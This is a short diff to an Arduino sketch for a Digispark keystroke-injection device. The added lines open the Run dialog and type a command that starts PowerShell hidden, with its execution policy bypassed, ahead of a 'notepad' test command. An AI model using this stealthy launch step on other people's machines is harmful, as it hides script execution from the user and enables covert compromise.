@@ -26,6 +26,12 @@ void setup() {
   DigiKeyboard.sendKeyPress(0);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
+  //open powershell window and hide in background
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(60);
+  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden");
+  DigiKeyboard.delay(60);
+  
   //test command
   DigiKeyboard.println("notepad");
   delay(600);
